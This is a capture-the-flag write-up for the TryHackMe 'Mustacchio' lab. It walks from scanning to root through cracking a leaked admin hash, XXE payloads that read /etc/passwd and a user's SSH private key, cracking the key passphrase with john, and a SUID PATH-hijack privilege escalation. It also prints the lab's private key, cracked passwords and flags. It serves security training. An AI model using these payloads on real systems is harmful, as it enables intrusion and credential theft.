# Mustacchio
## Initial Foothold
**Port Scanning**
```sh
┌──(bc-here㉿BC-Here)-[~/CTF/THM/Mustacchio]
└─$ sudo python3 pymap.py -t thm --all >> ports.txt


┌──(bc-here㉿BC-Here)-[~/CTF/THM/Mustacchio]
└─$ cat ports.txt

[+] Port scanning...
22/tcp   open  ssh
80/tcp   open  http
8765/tcp open  ultraseek-http
[+] Enumerating open ports...

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)
|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)
|_  256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)


PORT     STATE SERVICE VERSION
8765/tcp open  http    nginx 1.10.3 (Ubuntu)
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Mustacchio | Login


PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Mustacchio | Home
```
**FeroxBuster**
```sh
┌──(bc-here㉿BC-Here)-[~/CTF/THM/Mustacchio]
└─$ feroxbuster -u http://thm/ >> ferox.txt

┌──(bc-here㉿BC-Here)-[~/CTF/THM/Mustacchio]
└─$ cat ferox.txt
404      GET        9l       31w      265c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter

403      GET        9l       28w      268c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter

301      GET        9l       28w      295c http://thm/images => http://thm/images/

200      GET       64l      394w     3152c http://thm/about.html

200      GET       51l      118w     1450c http://thm/contact.html

200      GET      226l      582w     3407c http://thm/custom/css/mobile.css

200      GET       48l      287w    21145c http://thm/images/logo.jpg

200      GET      409l     1056w     7674c http://thm/custom/css/style.css

200      GET       83l      356w     3172c http://thm/blog.html

200      GET       90l      158w     1950c http://thm/gallery.html

200      GET       99l      489w    34323c http://thm/images/the-nerd.jpg

200      GET      159l      766w    52904c http://thm/images/the-actor.jpg

200      GET      447l     3714w   216173c http://thm/images/the-beacon.jpg

301      GET        9l       28w      294c http://thm/fonts => http://thm/fonts/

200      GET       40l       74w     1433c http://thm/custom/js/mobile.js

200      GET       72l      148w     1752c http://thm/index.html

200      GET        3l       45w     1640c http://thm/images/mobile-collapse.png

200      GET        5l       57w     2469c http://thm/images/mobile-close.png

200      GET       94l      506w    39362c http://thm/images/the-father.jpg

200      GET       72l      148w     1752c http://thm/

200      GET       95l      565w    36834c http://thm/fonts/pollerone/pollerone-webfont.eot

200      GET      130l      665w    46485c http://thm/images/cutting-mustache.jpg

200      GET      121l      558w    37175c http://thm/images/mustache4.jpg

301      GET        9l       28w      295c http://thm/custom => http://thm/custom/

200      GET        1l       15w     8204c http://thm/custom/js/users.bak

200      GET      150l      871w    73893c http://thm/fonts/leckerlione/leckerlione-regular-webfont.woff

200      GET       89l      519w    43404c http://thm/fonts/pollerone/pollerone-webfont.woff

200      GET        5l       46w     1667c http://thm/images/mobile-expand.png

200      GET       24l      167w    10827c http://thm/images/icons.jpg

200      GET      109l      729w    61298c http://thm/images/mustache9.jpg

200      GET      369l     1623w   106688c http://thm/images/grew-a-mustache.jpg

200      GET       90l      538w    38230c http://thm/images/mustache6.jpg

200      GET      248l      827w    54663c http://thm/images/photographer.jpg

200      GET        8l       69w     2880c http://thm/images/icons/icon-pinterest.jpg

200      GET       11l       71w     2834c http://thm/images/icons/icon-twitter.jpg

200      GET        6l       52w     2284c http://thm/images/icons/icon-twitter-hover.jpg

200      GET        6l       59w     2355c http://thm/images/icons/icon-pinterest-hover.jpg

200      GET        4l       56w     2305c http://thm/images/icons/icon-facebook.jpg

200      GET        7l       68w     2993c http://thm/images/icons/icon-googleplus.jpg

200      GET       11l       64w     2541c http://thm/images/icons/icon-googleplus-hover.jpg

200      GET      237l     8774w    71643c http://thm/fonts/pollerone/pollerone-webfont.svg

200      GET      159l     1000w    88773c http://thm/images/mustache3.jpg

200      GET      180l      863w    62948c http://thm/images/mustache1.jpg

200      GET        5l       48w     1755c http://thm/images/icons/icon-facebook-hover.jpg

200      GET      182l      992w    65241c http://thm/fonts/leckerlione/leckerlione-regular-webfont.eot

200      GET      146l      926w    70606c http://thm/images/in-the-country.jpg

200      GET      160l      774w    59658c http://thm/images/mustache8.jpg

200      GET      736l     2850w    98519c http://thm/fonts/leckerlione/leckerlione-regular-webfont.ttf

200      GET      362l     1673w    60630c http://thm/fonts/pollerone/pollerone-webfont.ttf

200      GET      243l     1101w    77164c http://thm/images/prim-and-proper.jpg

200      GET      140l      622w    43497c http://thm/images/mustache5.jpg

200      GET     2425l    26873w   186905c http://thm/fonts/leckerlione/leckerlione-regular-webfont.svg

200      GET      149l      708w    49100c http://thm/images/mustache2.jpg

200      GET        3l       42w     1526c http://thm/images/mobile-menu.png

404      GET        7l       13w      178c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter

403      GET        7l       11w      178c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter

200      GET       86l      182w     2095c http://thm:8765/assets/css/main.css

302      GET        0l        0w        0c http://thm:8765/auth/login.php =>

200      GET       24l       70w     1363c http://thm:8765/

301      GET        7l       13w      194c http://thm:8765/assets => http://thm:8765/assets/

301      GET        7l       13w      194c http://thm:8765/assets/css => http://thm:8765/assets/css/

301      GET        7l       13w      194c http://thm:8765/auth => http://thm:8765/auth/

301      GET        7l       13w      194c http://thm:8765/assets/fonts => http://thm:8765/assets/fonts/

301      GET        7l       13w      194c http://thm:8765/assets/imgs => http://thm:8765/assets/imgs/

```
- `http://thm/custom` this is very interesting
    - Form this url we got a file which is `user.bak`
**user.bak**
```sh
┌──(bc-here㉿BC-Here)-[~/CTF/THM/Mustacchio]
└─$ cat users.bak
��0]admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4b

┌──(bc-here㉿BC-Here)-[~/CTF/THM/Mustacchio]
└─$ file users.bak
users.bak: SQLite 3.x database, last written using SQLite version 3034001, file counter 2, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 2
```
**Hash-Identifier**
```sh
 HASH: 1868e36a6d2b17d4c2745f1659433a54d4bc5f4b

Possible Hashs:
[+] SHA-1
[+] MySQL5 - SHA-1(SHA-1($pass))

```
- After decrypting  it we got  `1868e36a6d2b17d4c2745f1659433a54d4bc5f4b:bulldog19`

**2nd WebServer**
- We got another webserver which is `http://thm:8765/`
![alt text](image.png)
- Lets try `admin` and `bulldog19`

**Checking for `XXE`**
![alt text](image-1.png)
- It seems like we have to use `xxe` here
- And The fact is recently I have learned xxe! 😁😁😁

- `//document.cookie = "Example=/auth/dontforget.bak"; ` this is in the comment of the html response
- `http://thm:8765/auth/dontforget.bak` there is a file here.

```sh
┌──(bc-here㉿BC-Here)-[~/CTF/THM/Mustacchio]
└─$ cat dontforget.bak
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment>
```
- I think we got the name for ssh login which could be `barry`
- For xxe and other vulnerability payloads we can check [Swisskyrepo](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md)

![alt text](image-2.png)

- The xxe is applying here!
- Lets get the /etc/passwd

```xml
xml=<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE+root+[<!ENTITY+test+SYSTEM+'file%3a///etc/passwd'>]>
<comment>
<name>Joe+Hamd</name>
<author>%26test%3b</author>
<com></com>
</comment>
```
```sh
Author : root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
joe:x:1002:1002::/home/joe:/bin/bash
barry:x:1003:1003::/home/barry:/bin/bash
```
- `barry:x:1003:1003::/home/barry:/bin/bash` lets try to get its ssh private key

```xml
xml=<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE+root+[<!ENTITY+test+SYSTEM+'file%3a///home/barry/.ssh/id_rsa'>]>
<comment>
<name>Joe+Hamd</name>
<author>%26test%3b</author>
<com></com>
</comment>
```
- This is the actual key format
```sh
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E

jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN
bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU
MZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim/7dNapEOujRmw+ruBE65
l2f9wZCfDaEZvxCSyQFDJjBXm07mqfSJ3d59dwhrG9duruu1/alUUvI/jM8bOS2D
Wfyf3nkYXWyD4SPCSTKcy4U9YW26LG7KMFLcWcG0D3l6l1DwyeUBZmc8UAuQFH7E
NsNswVykkr3gswl2BMTqGz1bw/1gOdCj3Byc1LJ6mRWXfD3HSmWcc/8bHfdvVSgQ
ul7A8ROlzvri7/WHlcIA1SfcrFaUj8vfXi53fip9gBbLf6syOo0zDJ4Vvw3ycOie
TH6b6mGFexRiSaE/u3r54vZzL0KHgXtapzb4gDl/yQJo3wqD1FfY7AC12eUc9NdC
rcvG8XcDg+oBQokDnGVSnGmmvmPxIsVTT3027ykzwei3WVlagMBCOO/ekoYeNWlX
bhl1qTtQ6uC1kHjyTHUKNZVB78eDSankoERLyfcda49k/exHZYTmmKKcdjNQ+KNk
4cpvlG9Qp5Fh7uFCDWohE/qELpRKZ4/k6HiA4FS13D59JlvLCKQ6IwOfIRnstYB8
7+YoMkPWHvKjmS/vMX+elcZcvh47KNdNl4kQx65BSTmrUSK8GgGnqIJu2/G1fBk+
T+gWceS51WrxIJuimmjwuFD3S2XZaVXJSdK7ivD3E8KfWjgMx0zXFu4McnCfAWki
ahYmead6WiWHtM98G/hQ6K6yPDO7GDh7BZuMgpND/LbS+vpBPRzXotClXH6Q99I7
LIuQCN5hCb8ZHFD06A+F2aZNpg0G7FsyTwTnACtZLZ61GdxhNi+3tjOVDGQkPVUs
pkh9gqv5+mdZ6LVEqQ31eW2zdtCUfUu4WSzr+AndHPa2lqt90P+wH2iSd4bMSsxg
laXPXdcVJxmwTs+Kl56fRomKD9YdPtD4Uvyr53Ch7CiiJNsFJg4lY2s7WiAlxx9o
vpJLGMtpzhg8AXJFVAtwaRAFPxn54y1FITXX6tivk62yDRjPsXfzwbMNsvGFgvQK
DZkaeK+bBjXrmuqD4EB9K540RuO6d7kiwKNnTVgTspWlVCebMfLIi76SKtxLVpnF
6aak2iJkMIQ9I0bukDOLXMOAoEamlKJT5g+wZCC5aUI6cZG0Mv0XKbSX2DTmhyUF
ckQU/dcZcx9UXoIFhx7DesqroBTR6fEBlqsn7OPlSFj0lAHHCgIsxPawmlvSm3bs
7bdofhlZBjXYdIlZgBAqdq5jBJU8GtFcGyph9cb3f+C3nkmeDZJGRJwxUYeUS9Of
1dVkfWUhH2x9apWRV8pJM/ByDd0kNWa/c//MrGM0+DKkHoAZKfDl3sC0gdRB7kUQ
+Z87nFImxw95dxVvoZXZvoMSb7Ovf27AUhUeeU8ctWselKRmPw56+xhObBoAbRIn
7mxN/N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD
-----END RSA PRIVATE KEY-----
```

```sh
┌──(bc-here㉿BC-Here)-[~/CTF/THM/Mustacchio]
└─$ sudo ssh -i id_rsa barry@thm
[sudo] password for bc-here:
Enter passphrase for key 'id_rsa':
```
- It requires a passphrase
- Lets try `john the ripper with ssh2john`

```sh
┌──(bc-here㉿BC-Here)-[~/CTF/THM/Mustacchio]
└─$ sudo ssh -i id_rsa barry@thm
Enter passphrase for key 'id_rsa':


┌──(bc-here㉿BC-Here)-[~/CTF/THM/Mustacchio]
└─$

┌──(bc-here㉿BC-Here)-[~/CTF/THM/Mustacchio]
└─$ ssh2john id_rsa >> ssh.hash

┌──(bc-here㉿BC-Here)-[~/CTF/THM/Mustacchio]
└─$ sudo john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
`urieljames`       (id_rsa)
1g 0:00:00:02 DONE (2024-09-25 12:58) 0.3984g/s 1183Kp/s 1183Kc/s 1183KC/s urieljr.k..urielandrea
Use the "--show" option to display all of the cracked passwords reliably
Session completed.


┌──(bc-here㉿BC-Here)-[~/CTF/THM/Mustacchio]
└─$ sudo ssh -i id_rsa barry@thm
[sudo] password for bc-here:
Enter passphrase for key 'id_rsa':
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

34 packages can be updated.
16 of these updates are security updates.
To see these additional updates run: apt list --upgradable


Last login: Wed Sep 25 06:59:04 2024 from 10.11.96.92
barry@mustacchio:~$

barry@mustacchio:~$ cat user.txt
62d77a4d5f97d47c5aa38b3b2651b831
```
**user.txt:`62d77a4d5f97d47c5aa38b3b2651b831`**

```sh
barry@mustacchio:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/at
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/newuidmap
/usr/bin/gpasswd
/home/joe/live_log
/bin/ping
/bin/ping6
/bin/umount
/bin/mount
/bin/fusermount
/bin/su
barry@mustacchio:~$ cd /home/joe
barry@mustacchio:/home/joe$ ls
live_log
barry@mustacchio:/home/joe$ ./live_log
10.11.96.92 - - [25/Sep/2024:08:05:55 +0000] "POST /home.php HTTP/1.1" 200 1123 "http://thm:8765/home.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
10.11.96.92 - - [25/Sep/2024:08:06:00 +0000] "POST /home.php HTTP/1.1" 200 1123 "http://thm:8765/home.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
10.11.96.92 - - [25/Sep/2024:08:06:15 +0000] "POST /home.php HTTP/1.1" 200 1123 
^CLive Nginx Log Readerbarry@mustacchio:/home/joe$
```
```sh
barry@mustacchio:/home/joe$ strings live_log
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
printf

`tail -f /var/log/nginx/access.log`
```
- But `tail` is not in the $PATH variable!
- Lets get it into
```sh
barry@mustacchio:~$ echo /bin/bash > tail
barry@mustacchio:~$ ls
tail  user.txt
barry@mustacchio:~$ cat tail
/bin/bash
```

```sh
barry@mustacchio:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
barry@mustacchio:~$ export PATH=$(pwd):$PATH
barry@mustacchio:~$ chmod +x tail
barry@mustacchio:~$ ../joe/live_log
root@mustacchio:~# cd /root
root@mustacchio:/root# cat root.txt
3223581420d906c4dd1a5f9b530393a5
```
**root.txt:`3223581420d906c4dd1a5f9b530393a5`**

# What was That!🔥🔥🔥🔥🔥